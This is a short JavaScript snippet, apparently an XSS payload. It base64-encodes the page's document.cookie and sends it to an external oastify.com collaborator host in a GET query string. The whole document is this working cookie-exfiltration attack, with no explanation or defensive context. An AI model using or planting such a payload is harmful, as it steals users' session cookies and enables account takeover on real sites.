let b = btoa(document.cookie)

fetch('https://ho9as0ox8mt4m8a09boltsrt6kcb01oq.oastify.com/aa?cookies='.concat(b), {
    method: 'GET', 
    credentials: 'include', 
    headers: {
      'Content-Type': 'application/json'
    }
  })
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Erro:', error));
